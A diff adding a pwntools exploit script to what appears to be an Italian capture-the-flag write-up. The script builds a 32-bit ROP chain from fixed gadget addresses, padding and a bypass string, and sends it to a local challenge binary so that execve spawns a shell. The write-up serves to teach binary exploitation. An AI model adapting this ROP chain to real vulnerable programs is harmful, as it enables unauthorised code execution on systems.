@@ -57,4 +57,47 @@ Devo quindi creare una rop chain in grado di:
 
 E' chiaro che per iniettare ciò di cui ho bisogno basta inserirli nella stringa di buffer overflow senza cercare robe assurde nei gadget...
 
+# Script
+```python
+from pwn import *
+
+# saves addresses of useful gadgets
+pop_eax_ret = p32(0x0804851d)
+pop_ebx_ret = p32(0x08048526)
+pop_ecx_ret = p32(0x08048530)
+pop_edx_ret = p32(0x08048528)
+int_ret = p32(0x0804852d)
+
+# needed injected data
+zero = p32(0x00000000)
+execve_eax = p32(0x0000000b)
+bash_addr = p32(0x0804a02c)
+
+# padding
+padd = b'A' * 12
+
+# if bypass
+bypass = b'due' + b'\0'
+
+# craft the ropchain payload
+payload  = bypass
+payload += padd
+payload += pop_eax_ret
+payload += execve_eax
+payload += pop_ebx_ret
+payload += bash_addr
+payload += pop_ecx_ret
+payload += zero
+payload += int_ret
+
+bin = "./fiera_dell_est"
+p = process(bin)
+# p = gdb.debug(bin, gdbscript="b *0x080485ad\nc")
+
+log.info("Injecting ropchain payload")
+p.sendline(payload)
+
+log.info("A Shell for you mister!")
+p.interactive()
+```
 
